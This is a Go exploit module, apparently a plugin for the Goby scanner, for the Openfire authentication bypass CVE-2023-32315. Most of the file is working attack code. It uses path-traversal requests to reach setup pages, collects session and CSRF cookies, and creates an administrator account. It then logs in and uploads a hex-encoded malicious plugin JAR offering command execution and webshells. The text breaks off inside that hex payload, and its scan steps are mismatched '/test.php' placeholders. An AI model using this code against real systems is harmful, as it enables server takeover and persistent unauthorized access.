package exploits

import (
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ignite Realtime Openfire Permission Bypass Vulnerability (CVE-2023-32315)",
    "Description": "<p>Ignite Realtime Openfire is a cross platform open source real-time collaboration (RTC) server developed in Java and based on XMPP (formerly known as Jabber, instant messaging protocol) by the Ignite Realtime community. It can build efficient instant messaging servers and support tens of thousands of concurrent users.</p><p>Ignite Realtime Openfire has a privilege bypass vulnerability, allowing attackers to access the Openfire console by adding an administrator user and further executing arbitrary code, thereby controlling server privileges.</p>",
    "Product": "Openfire",
    "Homepage": "http://www.igniterealtime.org/projects/openfire/",
    "DisclosureDate": "2023-05-26",
    "PostTime": "2023-06-15",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "(body=\"background: transparent url(images/login_logo.gif) no-repeat\" && body=\"Openfire\") || (body=\"class=\\\"row justify-content-center\\\"\" && body=\"<title>Openfire 管理界面</title>\") || title=\"Openfire Admin Console\" || title=\"Openfire HTTP Binding Service\" || (body=\"align=\\\"right\\\" id=\\\"jive-loginVersion\" && body=\"Openfire\") || title=\"Открытый огонь Консоль Администрации\" || title==\"Openfire 管理界面\"",
    "GobyQuery": "(body=\"background: transparent url(images/login_logo.gif) no-repeat\" && body=\"Openfire\") || (body=\"class=\\\"row justify-content-center\\\"\" && body=\"<title>Openfire 管理界面</title>\") || title=\"Openfire Admin Console\" || title=\"Openfire HTTP Binding Service\" || (body=\"align=\\\"right\\\" id=\\\"jive-loginVersion\" && body=\"Openfire\") || title=\"Открытый огонь Консоль Администрации\" || title==\"Openfire 管理界面\"",
    "Level": "3",
    "Impact": "<p>Ignite Realtime Openfire has a privilege bypass vulnerability, allowing attackers to access the Openfire console by adding an administrator user and further executing arbitrary code, thereby controlling server privileges.</p>",
    "Recommendation": "<p>The official repair patch has been released, please update it promptly: <a href=\"https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm\">https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm</a></p>",
    "References": [
        "https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "createSelect",
            "value": "register,cmd,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "username",
            "type": "input",
            "value": "",
            "show": "attackType=register"
        },
        {
            "name": "password",
            "type": "input",
            "value": "",
            "show": "attackType=register"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "antSword,godzilla,cmd",
            "show": "attackType=webshell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "Permission Bypass"
    ],
    "VulType": [
        "Command Execution",
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2023-32315"
    ],
    "CNNVD": [
        "CNNVD-202305-2306"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Ignite Realtime Openfire 权限绕过漏洞（CVE-2023-32315）",
            "Product": "Openfire",
            "Description": "<p>Ignite Realtime Openfire是Ignite Realtime社区的一款采用Java开发且基于XMPP（前称Jabber，即时通讯协议）的跨平台开源实时协作（RTC）服务器。它能够构建高效率的即时通信服务器，并支持上万并发用户数量。</p><p>Ignite Realtime Openfire 存在权限绕过漏洞，攻击者可访问Openfire 控制台通过添加管理员用户，并可进一步执行任意代码，从而控制服务器权限。</p>",
            "Recommendation": "<p>官方已发布了修复补丁，请及时更新：<a href=\"https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm\" target=\"_blank\">https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm</a></p>",
            "Impact": "<p>Ignite Realtime Openfire 存在权限绕过漏洞，攻击者可访问Openfire 控制台通过添加管理员用户，并可进一步执行任意代码，从而控制服务器权限。</p>",
            "VulType": [
                "权限绕过",
                "命令执行"
            ],
            "Tags": [
                "权限绕过",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ignite Realtime Openfire Permission Bypass Vulnerability (CVE-2023-32315)",
            "Product": "Openfire",
            "Description": "<p>Ignite Realtime Openfire is a cross platform open source real-time collaboration (RTC) server developed in Java and based on XMPP (formerly known as Jabber, instant messaging protocol) by the Ignite Realtime community. It can build efficient instant messaging servers and support tens of thousands of concurrent users.</p><p>Ignite Realtime Openfire has a privilege bypass vulnerability, allowing attackers to access the Openfire console by adding an administrator user and further executing arbitrary code, thereby controlling server privileges.</p>",
            "Recommendation": "<p>The official repair patch has been released, please update it promptly:&nbsp;<a href=\"https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm\" target=\"_blank\">https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm</a></p>",
            "Impact": "<p>Ignite Realtime Openfire has a privilege bypass vulnerability, allowing attackers to access the Openfire console by adding an administrator user and further executing arbitrary code, thereby controlling server privileges.<br></p>",
            "VulType": [
                "Command Execution",
                "Permission Bypass"
            ],
            "Tags": [
                "Command Execution",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10798"
}`
	// 获取tcp发包中http响应cookie中的JSESSIONID和csrf
	getTcpCookieInfo247329 := func(cookieStr string) (string, string) {
		regCookie, _ := regexp.Compile(`Set-Cookie: (.*?)\n`)
		regCookieStr := regCookie.FindAllStringSubmatch(cookieStr, -1)
		if len(regCookieStr) < 2 || len(regCookieStr[0]) < 2 || len(regCookieStr[1]) < 2 {
			return "", ""
		}
		JSESSIONID := ""
		cookies := strings.Split(regCookieStr[0][1], ";")
		for _, cookie := range cookies {
			if strings.Contains(cookie, "JSESSIONID=") {
				JSESSIONID = cookie
			}
		}
		csrfToken := ""
		csrfTokens := strings.Split(regCookieStr[1][1], ";")
		for _, csrfTokenTemp := range csrfTokens {
			if strings.Contains(csrfTokenTemp, "csrf=") {
				csrfToken = csrfTokenTemp
			}
		}
		return JSESSIONID, csrfToken
	}

	// 获取httpclient发包的http响应cookie中的JSESSIONID和csrf
	getHttpClientCookieInfo37450298 := func(cookie string) (string, string) {
		JSESSIONID, csrfToken := "", ""
		sessionReg, _ := regexp.Compile(`JSESSIONID=(.*?);`)
		sessions := sessionReg.FindAllStringSubmatch(cookie, -1)
		if len(sessions) > 0 && len(sessions[0]) > 1 {
			JSESSIONID = sessions[0][1]
		}
		csrfTokenReg, _ := regexp.Compile(`csrf=(.*?);`)
		csrfTokens := csrfTokenReg.FindAllStringSubmatch(cookie, -1)
		if len(csrfTokens) > 0 && len(csrfTokens[0]) > 1 {
			csrfToken = csrfTokens[0][1]
		}
		return JSESSIONID, csrfToken
	}

	//tcp发http请求包， 获取JSESSIONID, csrfToken
	tcpHttpConnection5362341 := func(hostInfo *httpclient.FixUrl, dataContent string) string {
		conn, err := httpclient.GetTCPConn(hostInfo.HostInfo)
		if err != nil {
			return ""
		}
		if strings.HasSuffix(hostInfo.FixedHostInfo, "https") {
			conn = tls.Client(conn, &tls.Config{
				//MinVersion:         tls.VersionTLS10,
				InsecureSkipVerify: true,
			})
		}
		defer conn.Close()
		// TCP 发包
		_, err = conn.Write([]byte(dataContent))
		resp := make([]byte, 0)
		buf := make([]byte, 1024)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				// 处理读取错误
				break
			}
			resp = append(resp, buf[:n]...)
			if n < len(buf) {
				break // 数据已经全部读取完毕
			}
		}
		return string(resp)
	}

	// payload1 发送请求包， 获取JSESSIONID, csrfToken
	getCookie4738998 := func(hostInfo *httpclient.FixUrl) (string, string) {
		httpContent := "GET /setup/setup-s/%u002e%u002e/%u002e%u002e/plugin-admin.jsp HTTP/1.1\r\n"
		httpContent += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
		httpContent += "Accept-Encoding: gzip, deflate\r\n"
		httpContent += "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5658.194 Safari/537.36\r\n"
		httpContent += fmt.Sprintf("Host: %s\r\n\r\n", hostInfo.HostInfo)
		responseGet := tcpHttpConnection5362341(hostInfo, httpContent)
		if len(responseGet) < 2 {
			return "", ""
		}
		return getTcpCookieInfo247329(responseGet)

	}
	// payload2 通过JSESSIONID, csrfToken注册用户
	registerAccount487579347 := func(hostInfo *httpclient.FixUrl, cookie string, csrfToken string, username string, password string) (bool, string, string) {
		registerAccountUrl := "/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?" + csrfToken + "&username=" + username + "&name=" + username + "&email=" + username + "%40gmail.com&password=" + password + "&passwordConfirm=" + password + "&isadmin=on&create=Create+User"
		httpContent := "GET " + registerAccountUrl + " HTTP/1.1\r\n"
		httpContent += fmt.Sprintf("Host: %s\r\n", hostInfo.HostInfo)
		httpContent += fmt.Sprintf("Cookie: %s; %s;\r\n\r\n", cookie, csrfToken)
		response := tcpHttpConnection5362341(hostInfo, httpContent)
		if strings.Contains(response, " 200 OK") {
			return true, username, password
		}
		return true, username, password
	}
	// payload4 通过验证登陆接口获取的cookie，访问其他接口，验证注册账户的有消息
	verifyAccount378297 := func(hostInfo *httpclient.FixUrl, loginCookie string, username string) bool {
		configGet := httpclient.NewGetRequestConfig("/user-properties.jsp?username=" + username)
		configGet.Header.Store("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5656.226 Safari/537.36")
		configGet.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		configGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		configGet.Header.Store("Cookie", loginCookie)
		configGet.Header.Store("Origin", hostInfo.FixedHostInfo)
		configGet.Header.Store("Referer", hostInfo.FixedHostInfo+"/login.jsp")
		resp, err := httpclient.DoHttpRequest(hostInfo, configGet)
		if err != nil {
			return false
		}
		if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "extraParams") && strings.Contains(resp.Utf8Html, `href="/user-create.jsp"`) && strings.Contains(resp.Utf8Html, "/pubsub-node-summary.jsp?username="+username) {
			return true
		}
		return false
	}

	// payload3 通过注册的用户名和密码，进行登陆
	loginAccount74859 := func(hostInfo *httpclient.FixUrl, JSESSIONID string, csrfToken string, username string, password string) string {
		configPost := httpclient.NewPostRequestConfig("/login.jsp")
		configPost.VerifyTls = false
		configPost.FollowRedirect = false
		configPost.Header.Store("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5656.226 Safari/537.36")
		configPost.Header.Store("Cookie", fmt.Sprintf("%s; %s", JSESSIONID, csrfToken))
		configPost.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		configPost.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		configPost.Header.Store("Referer", hostInfo.FixedHostInfo+"/login.jsp?url=%2Findex.jsp")
		configPost.Header.Store("Origin", hostInfo.FixedHostInfo)
		configPost.Data = "url=%2Findex.jsp&login=true&" + csrfToken + "&username=" + username + "&password=" + password
		resp, err := httpclient.DoHttpRequest(hostInfo, configPost)
		if err != nil {
			return ""
		} else if strings.Contains(resp.Utf8Html, "document.loginForm.username") || strings.Contains(resp.Utf8Html, "document.loginForm.password") {
			return ""
		}
		return resp.Cookie
	}

	// payload5 根据获取有效的用户cookie，进行上传jar包，getShell
	uploadShell81740 := func(hostInfo *httpclient.FixUrl, JSESSIONID string, csrfToken string) (bool, string) {
		configUploadShell := httpclient.NewPostRequestConfig("/plugin-admin.jsp?uploadplugin&csrf=" + csrfToken)
		configUploadShell.Header.Store("Host", hostInfo.HostInfo)
		configUploadShell.Header.Store("Origin", hostInfo.HostInfo)
		configUploadShell.FollowRedirect = false
		configUploadShell.Header.Store("Content-Length", "7958")
		configUploadShell.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryRFAiXRO6W77il7yc")
		configUploadShell.Header.Store("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
		configUploadShell.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		configUploadShell.Header.Store("Referer", fmt.Sprintf("%s/plugin-admin.jsp", hostInfo.FixedHostInfo))
		configUploadShell.Header.Store("Cookie", fmt.Sprintf("CookieLanguageName=ZH-CN; JSESSIONID=%s; csrf=%s", JSESSIONID, csrfToken))
		configUploadShell.Header.Store("Content-Length", "7958")
		configUploadShell.Header.Store("Connection", "close")
		uploadJarContent, _ := hex.DecodeString("436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2275706c6f616466696c65223b2066696c656e616d653d226f72672e6a697665736f6674776172652e6f70656e666972652e706c7567696e2e4356452d6f70656e666972652d706c7567696e2d617373656d626c792e6a6172220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6a6176612d617263686976650d0a0d0a504b030414000008080045bfcf56acfaf4383c0000003c000000140000004d4554412d494e462f4d414e49464553542e4d46f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5722e4a4d2c494dd175aab45208c849ad282d56702c4acec82c4b2d5230d1330029e1e50200504b03040a000008000045bfcf56000000000000000000000000090000004d4554412d494e462f504b03040a00000800002dbfcf56000000000000000000000000040000007765622f504b03040a0000080000079ccf560000000000000000000000000c0000007765622f5745422d494e462f504b03040a000008000045bfcf56000000000000000000000000050000006931386e2f504b03040a000008000045bfcf56000000000000000000000000040000006c69622f504b03041400000808008cbccf5648f12ac339010000c40200000a000000706c7567696e2e786d6c6d52b96ec3300cddf31582765b4e5c141d1467ead2a94081ec8ccd380a7418929ce6f32bc9279c4ea41edfe3297e7a2a491e689d30fa48f7794109eada3442b747dafb6bf641c9a9da11427827fb56e8e4c7672dc1b9cad83617ad161e2d82f442616e3ad4576131c727a84e62de1ad306031dd4b705fd1cec77cacad9906e3765d7a0b01a840ec106a1750a3d70962213ad41575bd1f9d0fdffec3561128de356615acea6c75c197a7f33b6f2cf2b67a33f57038fd5a1389459f19eeddf42f608cc4a25f40fda90f0bc1488255ef095e00b1e705ef7b3c196b69a10a98d7646cee347dcc38588e64883cd5caa4257e1c870a2c10bd8c41afd91198cf7e1d26e2389aa70519524c35a87e35312b7bfc57a2b27e8d7065d5996f9dd7594ac969f08cd40a2846d5a64635febc1589868de147b199fb3e93ffe01504b030414000008080043bfcf560ac49277a50000005f010000220000006931386e2f6578616d706c65706c7567696e5f6931386e2e70726f706572746965736d8f3d0ec2300c46774e612ed01b6464035151063694b65f21929b96da41e5f684fe2011b158d6f3b3f519a36d7b46cfe1e67ca64e19663733ca27b8c18fd2f5ea3a2f8944c71927b2d827ea4c425541c4145075fe2634615a7013985f59b238e011dc80da9c96861a07ae25f5ea38ab96405e3190de416bb433464d7c8de8cab6049bcb61ff6798b54e24863439c30a08dfab8b4b1f6b9b6c9641b59bdf35452cb4befa06504b030414000008080044bfcf567b4a11babd01000022080000130000007765622f5745422d494e462f7765622e786d6cd595416fdb201886effe15cc772089a5a88a1c5755d51da6eeb4b6da2da2f88b8b850101b6937f3f4a1a37d63225bd349d2f36f0bd7e795ed97cf9f5a691a803eb8456cb744a262902c5752954b54c1f1fbee3abf4ba48f21e9e313306856ae596e98bf76641691c919a1ba26df53aa2cad19a750c204dd0fe8a558b8d1383aeef7bd26751349b4ca6f4f7cffb5ffc051a8685729e293e923bb17071f55e73e6e33e4ffba3d325f40d6a95ada664e3ca03cf21908c4cd380cfb5f2b0f1d830cb9a228f37ac580345782b012e8571406af07e4b6a6788b1c07563848432a707d56fca8ec9160a6f5bd8afee66723a364a92fc1bc6c94deb7513c83993728bb805e6a144cf5b74635808063de82604837e38734b128c832c92e40e6c27c11703d77ee67debb5e8c0e9b5ef9905a20da8b5080f46b69550e464c1edd31da9b4ae24f45678c8b26c15e8733ab2f9db9d4be6dc27d8ef7c7659d0218c4fcf86293f9bcd2e94cc31f32f928b65aad4cd7c3ebf5034fff03f231ddc8463239c905fe6cf6aad0c4786f7605541c73a1275870563b477968b219ef1831c01dca9fe03bcf3bef3238483f00390b161dca912e9358acd4479c43edc3ff27d6f2c923f504b030414000008080044bfcf568abead34443600009b460000300000006c69622f6f72672e6a697665736f6674776172652e6f70656e666972652e706c7567696e2e4356452d312e302e6a6172bd7b05541de99635ee125c8204777727b8bbbbbbbb139ca0c1dd25b8bb3bc15d82bb072e10e062e1cf9b7e6fd2e9e9eee99979fdd75db5ee5ab7cedee7d457bb4ed577abb6823438043a08080c0c8868f794daa89c97862e080888f9f7f5fbaf20b2a22a6fe924e5c41864dfca498a892aabd0cb8a5dcb8e8fc948d3d1cf204ad3514f8e4fd52b31ceb36ced3b514f8c53cdb89635284948cbd28e808c2691629a5e3b716181b6965219e00c070eec45a9406e0ed4cdf3421af3c1f3098777a1eb5627da7ce0c2f482ba140b15ebd0e9d00151f85e0edcf77240fea31c905f2db0bf2ee74798c86fc220beaff64ee6bf8a10fe4d04da3f232ccded2c5d4c9d4c0d6d5c2c6d4dff0480f7fb007b07533b334ba73f4392fe3748530f435b079b3f63a0f98b0ce6f6f6e67f4ac4fc3f2332743034b6f8333eeeff15df7fdde1df1e3f947ff25a59ba993adb9bb9b81b3afd5938eeef85ffce91f92d8ee84f710e36aee696767f0227fb2bf09f65f85b0ae6bf4af1174782e77fc5f717864ae8ff46fcdf8ea5d8bf855f584d94e18f9b0732c8af9a87ada19ba9dd9f04b3fcd7e0efe9e97f563afdbf0aa0ffa500e73f21d4f8df11fe23e6d7fbfcdb08fa7fedf32ffdfb1f6768c919c68c03d8f7de0df93de3ffe90c15fde55be1974cc63686cece952ab6f2686f5ff9256356d10d470e968553521a690728bf5564f243d19788602f7ddb4d6fca95ac639ff1a549eb2549acfc3248a087d034b393a601db087797ac99858787658aa5def9ee7ae98e106411c018a4a8336280746d69e2c0166dad21b1ed0515d96238e1598ea144c9dd726c30d2cbdc2f217c943c8d104956e47ba1d02422fc25c35d075e7e41b48541d2b35d975e9db81b31c28354d8928085f42a043f740fad91029b5c8a199d21a351374fff7afd1dede7f8b22b83306bcb3b5de359bc4f50fd6a10e4be52a40d5b01718dfc9c97d94b2701009f221fd48ec97268bed3398de4a06206e11d16cb6309824fc8baaffbcdbe310caaa85a70c62de89d754d089f2b9b16096fec64ab6cb0e084236aa72b47c662abbd1011de1412e0b08f945b25dab144e5401862afa22116a83e867b16e7a7b7519f51b902444a69d8e70721c8f12b5a000e6383d843f86b6e8ed0e508730c22af4a38a4a0bd1d0798f910fb1b1d6b0e76e8cf5b35867dcbf90c52b926dac742b7effddb08dbb24b76de8575dd59dd7dc0ed55c0eb4843800f8a22eb2f611857935808553dd1e1d7c776c97c04aaae209258b12e9749d23a0fbbab2e32b36208479728f6cc5399a527b5ad438a70a630dc14b19adc1658e29284329da8b554632743ed5974727c9378ed1e3f6b44705b6eee708c5f772dd81d0871cc4ade909d97251e1f8747ef07f92831faaaae21466488b5d8c2d5183a533486b49f2bf302ea712feb0d97f653681e83848f1033cf5a2fccc88e3929b703b7c44dbc595ca12b1ed2b636540ae57bc8d4c80417d00a37d03994235a7aa3d07c9c7b0226bdd85b91c9fc22d84ae80f44b052f1c4317c07c7c607f57187fb9b3fa4fd8f96e116b965f3111404e4051c0444efdfd6327e11bfa19d0b3333b3be95b303a9ea2f5a6f541e935b5578c597108ccd03a5f4a6304488d00425be4c0ca53d913e1c44b46e599058057341d6c9d86eef41cc0dac1b123e78201079ab4061b8381fb5a166b4ef967732338d8564737d730d6cb9af2d007d5b232c9b45c19c79f679a615a6a8208cf988863df4dbb272c03575eecc862b6f259f7e84814af9821f52be61a9e91b614a848134071f140fb97e2cc53dab990422221e6e5545cb84d5f68463fd43824d955cb14d58434f25d935ffd172fb06d8b4d07349b4e0cc682a13ba4226e3fe1e5ac3d627a1f5cc72304fc66f0b71db7147c078c68b932ac02ab14aed0b45ea7b2c09201391691126c387b6e01d7fb1fd8ae143ba9c331b5ed179e34a7bdb8e7ee6f28b117e7829d4f121a0d9b52764bd2b4c69027ea06bc9b0a1fa79a986e9f6b18efeae54e03a02180e79233333e0fd74f63881470d26ff15c6dcd398023f614e7c25ba005431975d5de3945fe6946a997a0db57e95a13e792e97df14792918167daf108ae76d326a20de860181440524ad5314a4f37980cbeb340853b5b2e3932f6c1158b1899aa1ef961e53467d0a996b03ef32e50dd97aabb7c1fde9625e9d02119ea07e96c85c003d69e17789c07dbf0934fc374bc4c9d0cec4de969d9dfd3f54a2f12f95c8daa32aa2f3618915831bf72ec2e52f96d152b266d1e3b26b6408b212a5a56223e611157bf6183f7c7221480b4807969fe55beee40be40a945d4ecebbe461a8db9cafc53a4fb51f6e8cdf4c4cd1803c7a18138b1e9d4e3b939fc88879f13e920b1d1f95220c4564950adca96c3d614d9f77b9ff4329a1c4d8c77362058ebcef8b93b261836a9850ccfb2e45b7b86cf545e2ca07254283c7cf444493f8b27b74576064fd0e2ae1e6cff00df5747778ce3b89335675036716492c033ed45f82a4d1ce7a58f40f50e7e9e84ea7b8abbe11989487667e2286ea22ad68f5a27caa8251c57b91c3bdc485d54fa1a89add659b7517ba249c73ba41db6c5db1b77d796f31e424cd9e9d3f0e8f3dc2642d05f75d2c7287174842569c0673f628753937bc78a3c8d46a5a6de64deb2d1906ee8182a192dd51321dc47874b6f8154d61745de6e92fc4d4e83b0575293b51ef319a30c5c3f0866f742afd026c6c0f516f3dc146eb27186134c403bea04d3221c4d640916e70135098bcd66927e37917975ba1c5a7dbdd2672390c467d1a33dac7c27be805c780fa44ae77c53186b373af0fde0df2432274df2502aaec631f800802b288f7efef22ee4edfafb32c2c2cff50c83ff5a1e1e99370e8fbf2cd64ac9ab673e88d1c19243a8c814dcd1b247113a120e49e01830804082f4e862b6b6d1175bdce9da37876edd842cb7af6d359cc1517cbd979eda6a6008820e1555659b1c5f3b374bbf5994aed14fc2f6dedd2c316c7779efa9ac926861d0207b1457777fc5317fc39e29bc0cff0faa00ee578f35b286b49b5a124e268c3e33a669ff8ed34cc4813d8e68461c13e9bf871c6c5e860e55d0bba9b7026e0c8a50f5706db36353622e24d98b2cdc3a9511a91580f888f7f52244961ab0c4f925f7d9f88f3d972f5b36eab4d581c0bdb3ceca2ceeb248b5a998d880c5d7251e4744bed20f9695ef0886c1576e3cf5c01552edcb5ebe1ab38a7850692178abba98ec4f12c95c69273310eca2818b7ab90f5f84f016fc5f3e3d46871f1d32536e44849daa369e34e8cdf6f37181ed2294fab75b50ffacae21e6f4b8c37a11e6fdfc6276d206c36c7f783a9cbf4a93abf1b5a3346c8c0e8332a969ddfdfa75185a00cbd1ec3194a10a3ff089c20644c003f785f617ae0f45ec6cba20fc59e9ab34f46ac2db23dc12ef5e33222e92cd7aac4f044625cb15bf26cd1c09d1b3906c799843ca86573a488d166b207739cdcb236249b6c39328c150f4b50312187516d2887e2ad0bd3742d8434a473a86cfb181ef395643b7687c3dcc971bf3a72af2cf7c9f6524d262f397ef3dca7e8694f3fda7e387c9a5a0985e6c119c519d6638b011bc27448c498778b81ef40167355fb57fabc9860b88935c44fa37adfb6b5949292fa8ac7a43bb6fbde1812daa1408cb534c630def9d2be55af1f714dcf9b5f2e2129995fd611b450ddd1327624c9529bb43f932d9ce0bb9f47993be188214df3eedd9059932060ac08f672c77c2ee985f35a2390647c08f37ee91ecd34b4731062d5a47086dba6aa4c444cb2662943de8f42c2073db2233e731d2bd098df8f5f63d6546c758b16b224ed9653c517b523a2586ae52d7ab5cc1041a5dea89098dfee323ec82b90a787df5e1bc617dc616467c1a3e9f4deb07796aa543b749aa047ef6c0e80d91b3d977b1c9eb7e93ab2d7669b5d53be20c625d64edd0dce8db443df4bcc6cf0d966cc2c0136991191faead8323d7b828dda819a26dd05db7e0ea0d65b86137fe4c1e35677a7822c2a3c6e86cb1892c9bbe4d06c706e12fc285e31eed84c8d2937509fcfd2cae5f40c551cc85d62cc8f09640a46418cda6cb39eca84bb327a2dbd4549d3908e8bbf745b3b1a9276f489bcbce2cc101a0d027dd9f4c086c6b90e50cc49bee332d425a55906cd25dcf2c625c7d33ebbf0cb92e89829cb71e6e7aa87d6ee4791b5f1b24ffbac6b3c286122e4b373ea6b333db35a4a0b93c472209e784b0e51716971f1dc72ef3017e74adb65bd49fb0f78ecf3cfa44fd7c2f40d9c3766d62f869f3d9a43dd6bc969e25c7873b53cf0b95e8f6422770f14b736332c5ef47bc37e39db58548dbddb25424496c3d1d07dafb35883835ffe62b2387f09ca4b0b70bb585d6ab63f812dc06bd54d7b22c28fdd4a8167a9b269d7c25767042897bb3f024ab626da8dbc9db765b83d99c77d64c8ce18e9f4d0d4c48259d434d2a67137f649ad53c9cde0345a1d3637be6577f1d582f0470cb33e9519ec8f1b55ef1a0339d7738cc72e9a2a10943ddf2a4fa9dc55f36ff553ed94a693d7ab28493e14c6c86f3bf656e8e4a515da2eedd45d6aeee5ae2c541f7b80e510bd67010b9d304af002e242aaa40dcc7df430359357dd7598dab67aae12c10adda55a6811a0d1e0a5cbef3b55d52fe0f6c3efeec5754a6f99db81182b16e92485428a2139e2707dc2e49f2a24b3d5dfa86257839bb8c9c55dc084df8e1c1fa73b2bd27ee60c3a64cdcc62361ca574e1ad0edc9b98f55b0d634a56e4652b89bf0d8c71ece8016f44431893486b3a31a52917add612f5930421ec229e666e5d641d79065277156f175dadf0a6d54f24c6a42495bc4335bde435fa4ca14af6d214235df60ddcad98c379ad81db334ce1b4bb60f7d4aa33b94e89ff893e893f5ba23c6b73e9121a28cc3ec6596000e0943e95c638c763aa481d456a523b1cbf95751a513224ec22035498623db2434b1571e1df8b384d3724060b2c5ce23fe154729b915e9b6d2a848893c70429f3ed0c5b03e15dd17dd7c22e6677b71b8f01955697d5ae3ec8fefd6f5e6bba36a15664c545c27373f97457ef5e240afbb80dad7fddbeb094233def17e0ce3f0354f23fbd936e4521fca6a9897bb7ab0fb0c7fde6bab37c56b37138c989ff12f3e2a0dc54933fdaa412d6e7d4be73a5cfed17f5524c3281669619765adc2c572d208c671edf6c0d94fc9cd6e900b8d965aeb2006e320fc2b172fb45e4b422e653644daceed9e15289d90871b1259073946cbc1e37a840df262a29a586cb48999f26b16741af534fe19e914898bac44c972944955bac6e7393905275df5b38dd4901613119f8f4c571058b41346c412e88be3eb343960771a76e7cd17432984f2ec8d5d5e8785447f7a074743e7354a6f8b90e6473c9c4f0335109a70646fd077a8e12ef18f6a36c049fbef2a5330ff2c1d53503ceacdafe631fe6e304b2136a74aa0618d853a7045ae378ce30df93c5f9fa8777e41cd7e71c8db603e79226aab13471de626a277552e96ba76fc5fd2c3e3518bd774f8f59e0c38398ad908ebc127f13775ac80cbbca0e8db1aea5ab95d4b59167c2cf91afb6785ca75709b1233957a3a36713345b3c565917901c3b1d5fa859dc6ba233161b3229516b9200f70d0a09ab5536a5048087d120e33495660a6ea6b9ffaed4e6f104bd50f35cc7907b1c103518d1003717eaca3487b634108b0d5eda9746c1c9767f5468530a2a5d5d20d01fa7086e72d9b01bc4b29674b605a5ab3182132e0f7365e224a7c4bdffe9834aa9353bd202ec55d3e7b4fc5be7f206f00019d414d55709097df5525d255573da64ab18adba5d1c38eeb25ea5ef1ecba76f839d0552bd326c551335a682fc11790142c2f8760add24204f0082d12ca83e82f11d2f1233accd43009fc6ed465e555030cf3c625fde9d2111260ac94033f4fb826f6e3a3d8853443e28634859c31353860b9a15705504e291d0d0182d7ea836cebdc427a1f5cbafd6f6e8b31d8337862e9254b0d03585b75d35849292af60300e1e64596d70566af1561d59f291204b2647f39550f8b9b2b76df9636f25935d27776cc244dc516a209b7906b42fcd8c5ad937b7192de9184bf9226da7d40016f4db8ada7b33efab8863cfa508caa93d1bd4f66b7db9095e537bae29250d239dd172ee34a0f91b285f5f1f7962544e8479751f0472b0e788b67822b8c714c833863eef729272866527a7882b2e5d5d45c27dd1442dcf89228e915fe299c2157f42540159fe34b02